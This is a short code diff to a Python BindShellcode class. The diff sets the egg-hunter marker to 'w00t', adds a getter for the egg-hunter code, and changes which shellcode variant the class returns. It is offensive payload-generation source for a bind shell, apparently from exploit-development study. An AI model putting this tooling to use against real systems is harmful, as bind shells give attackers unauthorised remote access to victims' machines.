@@ -13,7 +13,7 @@ class BindShellcode:
       self.__shellcode  = "";
 
       self.__egg_hunter           = False;
-      self.__egg_hunter_key       = "\\x11\\x22\\x33\\x44";
+      self.__egg_hunter_key       = "\\x77\\x30\\x30\\x74"; # => w00t
       self.__egg_hunter_code      = ""
       self.__egg_hunter_shellcode = ""
 
@@ -30,6 +30,9 @@ class BindShellcode:
     def egg_hunter(self):
         self.__egg_hunter = True;
 
+    def get_egg_hunter_code(self):
+        return self.__egg_hunter_code
+
 
     def set_egg_hunter_key(self, key):
       self.__egg_hunter_key = key;
@@ -38,11 +41,11 @@ class BindShellcode:
       self.__encode_key = key;
 
     def shellcode(self):
-      if self.__encode == True:
-        return self.__encoded_shellcode;
+      # if self.__encode == True:
+      #   return self.__encoded_shellcode;
 
       if self.__egg_hunter == True:
-        return {"egg_hunter_code": self.__egg_hunter_code, "egg_hunter_shellcode": self.__egg_hunter_shellcode};
+        return self.__egg_hunter_shellcode;
 
       return self.__shellcode
 
